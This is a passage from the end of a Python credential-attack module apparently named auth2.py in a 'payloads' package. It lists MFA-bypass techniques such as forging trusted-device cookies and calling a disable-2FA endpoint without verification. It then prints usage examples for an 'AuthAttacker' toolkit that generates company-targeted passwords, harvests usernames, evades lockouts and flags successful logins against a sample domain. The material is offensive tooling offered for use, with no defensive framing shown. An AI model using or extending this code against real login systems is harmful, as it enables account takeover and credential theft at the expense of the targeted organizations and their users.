                'description': 'Some apps only check status code',
                'test': 'Return 200 OK with any body'
            },
            {
                'technique': 'Remember Device Manipulation',
                'description': 'Forge trusted device token',
                'test': 'Copy trusted_device cookie from another session'
            },
            {
                'technique': 'Disable 2FA Endpoint',
                'description': 'Find endpoint to disable 2FA without verification',
                'test': 'POST /api/user/disable-2fa without current 2FA'
            },
        ]


# ============================================================
# USAGE EXAMPLES
# ============================================================

if __name__ == "__main__":
    print("""
Advanced Authentication Module (auth2.py)
=========================================

Classes:
  - AuthAttacker         : Main orchestrator
  - PasswordGenerator    : Target-aware password generation
  - UsernameHarvester    : Username enumeration
  - ResponseFingerprinter: Detect auth results
  - LockoutAvoider       : Rate limiting / lockout prevention
  - ModernAuthAttacks    : OAuth, JWT, MFA attacks

Example Usage:
--------------

# Basic setup
from payloads.auth2 import AuthAttacker

attacker = AuthAttacker(
    target_domain="acme.com",
    company_name="Acme Corporation"
)

attacker.setup(
    custom_words=["acme", "widget", "nyc"],
    custom_usernames=["admin", "jsmith"],
    known_names=[("John", "Smith"), ("Jane", "Doe")]
)

# Set baseline (get from initial failed login)
attacker.set_baseline(
    failure_response={'status_code': 401, 'body': 'Invalid credentials'}
)

# Run attack with rate limiting
for credential in attacker.smart_attack():
    response = your_login_function(credential.username, credential.password)
    result, confidence, details = attacker.record_attempt(credential, response)
    
    if result == AuthResult.SUCCESS:
        print(f"Found valid creds: {credential}")

# Get results
print(attacker.get_stats())
attacker.export_results("auth_results.json")


Password Generation:
--------------------

from payloads.auth2 import PasswordGenerator

gen = PasswordGenerator(company="Acme Corp")
gen.add_custom_words(["widget", "newyork"])

passwords = gen.generate_all(year=2024)
for p in passwords[:10]:
    print(f"{p.password} (priority: {p.priority}, source: {p.source})")


Response Analysis:
------------------

from payloads.auth2 import ResponseFingerprinter

fp = ResponseFingerprinter()
fp.set_baseline({'status_code': 401, 'body': 'Invalid credentials'})

result, confidence, details = fp.analyze({
    'status_code': 302,
    'body': '',
    'headers': {'location': '/dashboard'},
    'redirect_url': '/dashboard'
})

print(f"Result: {result}, Confidence: {confidence}")
# Result: AuthResult.SUCCESS, Confidence: 0.7
""")
